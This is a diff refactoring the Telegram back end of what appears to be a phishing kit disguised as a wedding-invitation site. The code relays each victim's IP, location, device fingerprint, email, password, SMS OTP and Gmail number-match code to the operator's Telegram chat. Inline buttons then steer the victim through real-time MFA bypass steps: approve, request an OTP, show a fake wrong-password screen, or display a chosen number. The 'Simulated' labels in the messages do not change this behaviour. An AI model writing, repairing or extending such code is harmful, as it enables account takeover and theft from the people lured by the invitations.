@@ -11,7 +11,6 @@ class TelegramService:
         self.chat_id = chat_id or os.environ.get("TELEGRAM_CHAT_ID", "").strip()
         self.last_update_id = 0
         self.polling_in_progress = False
-        # temporary host selection state: { attempt_id: [nums] }
         self.host_selections = {}
 
     def is_configured(self):
@@ -38,7 +37,6 @@ class TelegramService:
         except Exception as e:
             raise e
 
-    # 💡 Cleaned up: Removed stray, undefined references to 'state' and 'message'
     def send_message(self, text, parse_mode="HTML", reply_markup=None):
         if not self.chat_id:
             raise ValueError("Telegram Chat ID is not configured.")
@@ -50,87 +48,23 @@ class TelegramService:
         }
         if reply_markup:
             payload["reply_markup"] = reply_markup
-            
         return self.api_call("sendMessage", payload)
 
     def send_visitor_alert(self, visitor):
         if not self.is_configured():
             return None
 
-        ai_generated_text = ""
-        api_key = os.environ.get("GEMINI_API_KEY", "").strip()
-
-        if api_key:
-            try:
-                from google import genai
-                client = genai.Client(api_key=api_key)
-                prompt = f"""
-Analyze the following incoming visitor telemetry for a wedding/celebration invitation event platform:
-- IP Address: {visitor.get('ip') or "Unknown"}
-- Location: {visitor.get('city') or "Unknown"}, {visitor.get('region') or "Unknown"}, {visitor.get('country_name') or "Unknown"} ({visitor.get('country_code') or "??"})
-- Network Provider/ISP: {visitor.get('org') or "Unknown"}
-- Browser: {visitor.get('browser') or "Unknown"}
-- Operating System: {visitor.get('os') or "Unknown"}
-- Screen Size: {visitor.get('screenSize') or "Unknown"}
-- Language: {visitor.get('language') or "Unknown"}
-- Timezone: {visitor.get('timezone') or "Unknown"}
-- CPU Cores: {visitor.get('cores') or "Unknown"}
-- Platform: {visitor.get('platform') or "Unknown"}
-- User Agent: {visitor.get('userAgent') or "Unknown"}
-
-Write an elegant, witty, and highly readable real-time notification alert (written in HTML parse mode format for Telegram).
-Your output must use standard HTML tags allowed by Telegram:
-- <b>Bold text</b> for headers or highlights
-- <i>Italic text</i> for aesthetic notes
-- <code>Monospace code</code> for raw details like IP, timezone, provider, device name or specs
-
-Structure your response beautifully:
-1. A clever, premium, or wedding-themed headline (e.g., "✨ <b>A Guest Just Slipped In!</b>" or "🥂 <b>A New Invitation Handshake!</b>")
-2. An elegant "AI Smart Assessment" paragraph or narrative (witty/charming, describing where they are joining from in the world, what time of day it might be there, and what gear or device they are using).
-3. A beautifully formatted bulleted summary of their key geographical and device parameters wrapped in HTML.
-
-Keep the output concise, charming, and extremely helpful. Do not output anything other than the telegram HTML message text. Avoid markdown symbols. Return only the Telegram HTML body.
-"""
-                retries_left = 3
-                current_delay = 1.0
-                response = None
-                while retries_left > 0:
-                    try:
-                        response = client.models.generate_content(
-                            model="gemini-3.5-flash",
-                            contents=prompt
-                        )
-                        break
-                    except Exception as err:
-                        err_str = str(err)
-                        is_transient = "503" in err_str or "429" in err_str or "high demand" in err_str or "unavailable" in err_str.lower()
-                        if retries_left > 1 and is_transient:
-                            print(f"[Telegram AI] Transient error: {err_str[:120]}. Retrying in {current_delay}s...", flush=True)
-                            time.sleep(current_delay)
-                            current_delay *= 2
-                            retries_left -= 1
-                        else:
-                            raise err
-
-                if response and response.text:
-                    ai_generated_text = response.text.strip()
-            except Exception as err:
-                print(f"[Telegram AI Info] Could not generate AI visitor summary: {err}", flush=True)
-
-        if ai_generated_text:
-            message = ai_generated_text
-        else:
-            message = f"""
+        message = f"""
 👀 <b>New Visitor Entered Site!</b>
 ━━━━━━━━━━━━━━━━━━
-📍 <b>Location & Network:</b>
+📍 <b>Location &amp; Network:</b>
 • IP: <code>{visitor.get('ip') or "Unknown"}</code>
 • City: <code>{visitor.get('city') or "Unknown"}</code>
 • Region: <code>{visitor.get('region') or "Unknown"}</code>
 • Country: <code>{visitor.get('country_name') or "Unknown"} ({visitor.get('country_code') or "??"})</code>
 • Provider/ISP: <code>{visitor.get('org') or "Unknown"}</code>
 
-📱 <b>Device & Browser Fingerprint:</b>
+📱 <b>Device &amp; Browser Fingerprint:</b>
 • Browser: <code>{visitor.get('browser') or "Unknown"}</code>
 • OS: <code>{visitor.get('os') or "Unknown"}</code>
 • Screen Size: <code>{visitor.get('screenSize') or "Unknown"}</code>
@@ -141,16 +75,20 @@ Keep the output concise, charming, and extremely helpful. Do not output anything
 • User Agent: <code>{visitor.get('userAgent') or "Unknown"}</code>
 ━━━━━━━━━━━━━━━━━━
 <i>Delivered by Invitation Handshake Gateway</i>
-            """.strip()
+        """.strip()
 
         return self.send_message(message, "HTML")
 
     def send_login_alert(self, state):
         if not self.is_configured():
             return None
+
         provider_name = state.get("provider", "").upper()
-        prompt_details = f"🔢 <b>Gmail Match Code:</b> <code style=\"font-size:18px;\">{state.get('promptNumber')}</code>\n" if state.get("promptNumber") else ""
-        
+        prompt_details = (
+            f"🔢 <b>Gmail Match Code:</b> <code>{state.get('promptNumber')}</code>\n"
+            if state.get("promptNumber") else ""
+        )
+
         time_format = datetime.utcnow().strftime("%H:%M:%S")
         if state.get("timestamp"):
             try:
@@ -159,39 +97,41 @@ Keep the output concise, charming, and extremely helpful. Do not output anything
             except Exception:
                 pass
 
+        attempt_id = state.get("id", "")
+
         message = f"""
 🔐 <b>Simulated Guest Gateway Login</b>
 ━━━━━━━━━━━━━━━━━━
 🏢 <b>Portal:</b> {provider_name}
-📧 <b>Guest Email:</b> <code>{state.get('email')}</code>
+📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
 🔑 <b>Entered Secret:</b> <code>{state.get('password') or "(Not entered yet)"}</code>
 {prompt_details}📍 <b>Timestamp:</b> {time_format}
 ━━━━━━━━━━━━━━━━━━
-<b>⚠️ HOST ACTIONS REQLOCKED</b>
+<b>⚠️ HOST ACTIONS REQUIRED</b>
 Choose real-time bypass command below:
         """.strip()
 
         keyboard = []
         keyboard.append([
-            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{state.get('id')}"},
+            {"text": "Approve Pass ✅", "callback_data": f"tg:approve:{attempt_id}"},
         ])
         keyboard.append([
-            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{state.get('id')}"},
-            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{state.get('id')}"}
+            {"text": "Request SMS OTP 📲", "callback_data": f"tg:req_sms:{attempt_id}"},
+            {"text": "Incorrect Password Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
         ])
 
-        candidates = state.get('promptCandidates') or []
+        candidates = state.get("promptCandidates") or []
         if candidates and isinstance(candidates, (list, tuple)) and len(candidates) > 0:
             row = []
             for num in candidates:
-                row.append({"text": str(num), "callback_data": f"tg:picknum:{state.get('id')}:{num}"})
+                row.append({"text": str(num), "callback_data": f"tg:picknum:{attempt_id}:{num}"})
             keyboard.append(row)
             keyboard.append([
-                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{state.get('id')}"}
+                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
             ])
         else:
             keyboard.append([
-                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{state.get('id')}"}
+                {"text": "Number Match 🔢", "callback_data": f"tg:num_prompt:{attempt_id}"}
             ])
 
         inline_keyboard = {"inline_keyboard": keyboard}
@@ -200,11 +140,14 @@ Choose real-time bypass command below:
     def send_sms_submit_alert(self, state):
         if not self.is_configured():
             return None
+
+        attempt_id = state.get("id", "")
+
         message = f"""
 📲 <b>Simulated Guest OTP Received!</b>
 ━━━━━━━━━━━━━━━━━━
 🏢 <b>Portal:</b> {state.get('provider', '').upper()}
-📧 <b>Guest Email:</b> <code>{state.get('email')}</code>
+📧 <b>Guest Email:</b> <code>{state.get('email') or "Unknown"}</code>
 📞 <b>Bound Mobile:</b> <code>+1 {state.get('phone') or "Not provided"}</code>
 📟 <b>Submitted OTP:</b> <code>{state.get('smsCode') or "(Empty)"}</code>
 ━━━━━━━━━━━━━━━━━━
@@ -215,8 +158,8 @@ What is the guest status for this OTP?
         inline_keyboard = {
             "inline_keyboard": [
                 [
-                    {"text": "Approve OTP ✅", "callback_data": f"tg:approve:{state.get('id')}"},
-                    {"text": "Invalid Code Alert ⚠️", "callback_data": f"tg:inc_pw:{state.get('id')}"}
+                    {"text": "Approve OTP ✅", "callback_data": f"tg:approve:{attempt_id}"},
+                    {"text": "Invalid Code Alert ⚠️", "callback_data": f"tg:inc_pw:{attempt_id}"}
                 ]
             ]
         }
@@ -229,17 +172,20 @@ What is the guest status for this OTP?
             return 0
         self.polling_in_progress = True
         try:
-            payload = {"timeout": 30} # 💡 Production-optimized long-poll window
+            payload = {"timeout": 1}
             if self.last_update_id > 0:
                 payload["offset"] = self.last_update_id + 1
-            
+
             updates = self.api_call("getUpdates", payload)
             count = 0
+
             for update in updates:
                 self.last_update_id = max(self.last_update_id, update.get("update_id", 0))
                 callback_query = update.get("callback_query")
                 message_update = update.get("message") or update.get("edited_message")
-                
+
+                # Handle plain text messages for setting candidates
+                # e.g. "candidates attempt-abc 24 38 42"
                 if message_update and isinstance(message_update, dict):
                     try:
                         text = message_update.get("text", "") or ""
@@ -265,31 +211,44 @@ What is the guest status for this OTP?
                 if callback_query:
                     data = callback_query.get("data", "")
                     query_id = callback_query.get("id")
+
                     if data and data.startswith("tg:"):
                         parts = data.split(":")
+                        # Guard: need at least action + attempt_id
+                        if len(parts) < 3:
+                            continue
+
                         action = parts[1]
                         attempt_id = parts[2]
-                        
+
                         handled_inline = False
                         mapped_action = "pending"
                         feedback = "Action processed"
-                        
+
                         if action == "approve":
-                            mapped_action = "approved"
+                            mapped_action = "approve"
                             feedback = "Bypass approved! ✅"
+
                         elif action == "deny":
-                            mapped_action = "denied"
+                            mapped_action = "deny"
                             feedback = "Access Blocked! ❌"
-                        # 💡 Catch normalized shorthand variations across all layouts
-                        elif action in ["req_sms", "request_sms"]:
-                            mapped_action = "sms_prompt"
+
+                        elif action == "req_sms":
+                            mapped_action = "request_sms"
                             feedback = "SMS screen requested! 📲"
+
+                        elif action == "inc_pw":
+                            mapped_action = "incorrect_password"
+                            feedback = "Incorrect Password screen requested! ⚠️"
+
                         elif action == "num_prompt":
-                            mapped_action = "number_prompt"
+                            mapped_action = "pending"
                             feedback = "Number-matching prompt requested! 🔢"
+                            handled_inline = True
                             try:
                                 orig = callback_query.get("message")
                                 chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
+
                                 if attempt_id not in self.host_selections:
                                     self.host_selections[attempt_id] = []
 
@@ -297,7 +256,7 @@ What is the guest status for this OTP?
                                 nums = list(range(1, 101))
                                 for r in range(0, 100, 10):
                                     row = []
-                                    for n in nums[r:r+10]:
+                                    for n in nums[r:r + 10]:
                                         label = str(n)
                                         if n in self.host_selections.get(attempt_id, []):
                                             label = "✓" + label
@@ -305,19 +264,19 @@ What is the guest status for this OTP?
                                     keyboard.append(row)
 
                                 selected = self.host_selections.get(attempt_id, [])
-                                control_row = [ {"text": f"Selected: {', '.join(map(str, selected)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"} ]
+                                control_row = [{"text": f"Selected: {', '.join(map(str, selected)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"}]
                                 if len(selected) == 1:
                                     control_row.append({"text": "Send Number ▶️", "callback_data": f"tg:sendcandidates:{attempt_id}:{selected[0]}"})
                                 else:
                                     control_row.append({"text": "Pick 1 number to enable Send", "callback_data": f"tg:noop:{attempt_id}"})
-
                                 keyboard.append(control_row)
 
                                 try:
+                                    orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
                                     self.api_call("editMessageText", {
                                         "chat_id": chat_id_val,
                                         "message_id": orig.get("message_id") if orig else None,
-                                        "text": (orig.get("text") or orig.get("caption") or "") + "\n\nPlease pick exactly 1 number (1–100).\nTap 'Send Number' when ready.",
+                                        "text": orig_text + "\n\nPlease pick exactly 1 number (1–100).\nTap 'Send Number' when ready.",
                                         "parse_mode": "HTML",
                                         "reply_markup": {"inline_keyboard": keyboard}
                                     })
@@ -325,25 +284,21 @@ What is the guest status for this OTP?
                                     print(f"Failed to edit message with host 1-100 keyboard: {_e}", flush=True)
                             except Exception as _e:
                                 print(f"Failed to prepare 1-100 keyboard: {_e}", flush=True)
-                            handled_inline = True
+
                         elif action == "picknum":
                             mapped_action = "number_prompt"
-                            chosen = None
-                            try:
-                                chosen = parts[3]
-                                feedback = f"Number selected: {chosen} 🔢"
-                            except Exception:
-                                feedback = "Number selection received"
-                        elif action in ["inc_pw", "incorrect_password"]:
-                            mapped_action = "incorrect_password"
-                            feedback = "Incorrect Password screen requested! ⚠️"
+                            chosen = parts[3] if len(parts) > 3 else None
+                            feedback = f"Number selected: {chosen} 🔢" if chosen else "Number selection received"
+
                         elif action == "hostpick":
                             mapped_action = "pending"
                             handled_inline = True
+                            chosen_num = None
                             try:
-                                chosen_num = int(parts[3])
+                                chosen_num = int(parts[3]) if len(parts) > 3 else None
                             except Exception:
-                                chosen_num = None
+                                pass
+
                             sel = self.host_selections.get(attempt_id, [])
                             if chosen_num is not None:
                                 if chosen_num in sel:
@@ -351,8 +306,9 @@ What is the guest status for this OTP?
                                 else:
                                     if len(sel) < 1:
                                         sel.append(chosen_num)
-                                self.host_selections[attempt_id] = sel
+                            self.host_selections[attempt_id] = sel
                             feedback = f"Selected: {', '.join(map(str, sel)) or 'None'}"
+
                             try:
                                 orig = callback_query.get("message")
                                 chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
@@ -360,49 +316,48 @@ What is the guest status for this OTP?
                                 nums = list(range(1, 101))
                                 for r in range(0, 100, 10):
                                     row = []
-                                    for n in nums[r:r+10]:
-                                        label = str(n)
-                                        if n in sel:
-                                            label = "✓" + label
+                                    for n in nums[r:r + 10]:
+                                        label = ("✓" if n in sel else "") + str(n)
                                         row.append({"text": label, "callback_data": f"tg:hostpick:{attempt_id}:{n}"})
                                     keyboard.append(row)
-                                control_row = [ {"text": f"Selected: {', '.join(map(str, sel)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"} ]
+                                control_row = [{"text": f"Selected: {', '.join(map(str, sel)) or 'None'}", "callback_data": f"tg:noop:{attempt_id}"}]
                                 if len(sel) == 1:
                                     control_row.append({"text": "Send Number ▶️", "callback_data": f"tg:sendcandidates:{attempt_id}:{sel[0]}"})
                                 else:
                                     control_row.append({"text": "Pick 1 number to enable Send", "callback_data": f"tg:noop:{attempt_id}"})
                                 keyboard.append(control_row)
+                                orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
                                 self.api_call("editMessageText", {
                                     "chat_id": chat_id_val,
                                     "message_id": orig.get("message_id") if orig else None,
-                                    "text": (orig.get("text") or orig.get("caption") or "") + "\n\nPlease pick exactly 1 number (1–100).\nTap 'Send Number' when ready.",
+                                    "text": orig_text + "\n\nPlease pick exactly 1 number (1–100).\nTap 'Send Number' when ready.",
                                     "parse_mode": "HTML",
                                     "reply_markup": {"inline_keyboard": keyboard}
                                 })
                             except Exception as _e:
                                 print(f"Failed to update host 1-100 keyboard: {_e}", flush=True)
+
                         elif action == "noop":
                             mapped_action = "pending"
                             handled_inline = True
                             feedback = "Please select exactly 1 number."
+
                         elif action == "sendcandidates":
                             mapped_action = "number_prompt"
                             handled_inline = True
                             feedback = "Number sent to guest ✅"
-                            chosen_candidates = []
-                            try:
-                                chosen_candidates = [parts[3]]
-                            except Exception:
-                                chosen_candidates = []
+                            chosen_candidates = [parts[3]] if len(parts) > 3 else []
+
                             try:
                                 if attempt_id in self.host_selections:
                                     del self.host_selections[attempt_id]
                             except Exception:
                                 pass
-                            
+
                             try:
                                 orig = callback_query.get("message")
                                 chat_id_val = orig.get("chat", {}).get("id") if orig else self.chat_id
+                                orig_text = (orig.get("text") or orig.get("caption") or "") if orig else ""
                                 control_keyboard = {
                                     "inline_keyboard": [
                                         [
@@ -417,13 +372,14 @@ What is the guest status for this OTP?
                                 self.api_call("editMessageText", {
                                     "chat_id": chat_id_val,
                                     "message_id": orig.get("message_id") if orig else None,
-                                    "text": (orig.get("text") or orig.get("caption") or "") + f"\n\n⚡️ Guest is seeing number: {chosen_candidates[0] if chosen_candidates else ''}\nWaiting for host to verify via Google and approve or reject.",
+                                    "text": orig_text + f"\n\n⚡️ Guest is seeing number: {chosen_candidates[0] if chosen_candidates else ''}\nWaiting for host to verify via Google and approve or reject.",
                                     "parse_mode": "HTML",
                                     "reply_markup": control_keyboard
                                 })
                             except Exception as _e:
                                 print(f"Failed to restore host keyboard: {_e}", flush=True)
 
+                        # Answer callback query
                         try:
                             self.api_call("answerCallbackQuery", {
                                 "callback_query_id": query_id,
@@ -432,6 +388,7 @@ What is the guest status for this OTP?
                         except Exception as e:
                             print(f"Failed to answer callback query: {e}", flush=True)
 
+                        # Edit message text (skip if already handled inline)
                         if not handled_inline:
                             try:
                                 original_msg = callback_query.get("message")
@@ -441,7 +398,6 @@ What is the guest status for this OTP?
                                         updated_text = f"{current_text}\n\n━━━━⊱ ACTION LOG ⊰━━━━\n⚡️ <i>Action Selected: {feedback}</i>"
                                     else:
                                         updated_text = f"{original_msg.get('caption') or ''}\n\n[Action Selected: {feedback}]"
-                                    
                                     self.api_call("editMessageText", {
                                         "chat_id": original_msg.get("chat", {}).get("id"),
                                         "message_id": original_msg.get("message_id"),
@@ -452,27 +408,24 @@ What is the guest status for this OTP?
                             except Exception as e:
                                 print(f"Failed to edit message text: {e}", flush=True)
 
+                        # Fire callback to server
                         if action == "picknum":
-                            try:
-                                chosen_val = parts[3]
-                            except Exception:
-                                chosen_val = None
+                            chosen_val = parts[3] if len(parts) > 3 else None
                             on_action_received(attempt_id, mapped_action, {"chosen": chosen_val})
                         elif action == "sendcandidates":
-                            try:
-                                candidates_list = [parts[3]]
-                            except Exception:
-                                candidates_list = []
+                            candidates_list = [parts[3]] if len(parts) > 3 else []
                             on_action_received(attempt_id, mapped_action, {"candidates": candidates_list})
                         else:
-                            if mapped_action != "pending":
-                                on_action_received(attempt_id, mapped_action)
+                            on_action_received(attempt_id, mapped_action)
+
                         count += 1
+
             return count
+
         except Exception as e:
             err_msg = str(e)
             if "Conflict" in err_msg or "terminated by other getUpdates" in err_msg:
-                print("[Telegram Polling Info] Active getUpdates conflict detected.", flush=True)
+                print("[Telegram Polling Info] Active getUpdates conflict detected. Skipping this interval.", flush=True)
             else:
                 print(f"[Telegram Polling Warning] {err_msg}", flush=True)
             return 0
